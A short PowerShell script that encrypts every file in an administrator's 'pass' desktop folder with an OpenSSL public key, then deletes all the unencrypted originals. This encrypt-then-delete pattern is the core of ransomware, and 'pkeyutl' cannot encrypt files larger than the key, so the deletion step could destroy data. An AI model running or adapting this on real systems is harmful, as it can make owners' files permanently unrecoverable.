# Selects all the files in the folder
ForEach ($FileToEncrypt in Get-ChildItem "C:\Users\administrator\Desktop\pass") {
# Encrypts all files with the public key, and adds the ".encrypted" extension to the name of the encrypted files
openssl pkeyutl -encrypt -pubin -inkey publickey.crt -in $FileToEncrypt.FullName -out ($FileToEncrypt.FullName + ".encrypted")
}
# Deletes all unencrypted files in the folder
Remove-Item -recurse C:\Users\administrator\Desktop\pass\* -exclude *.encrypted
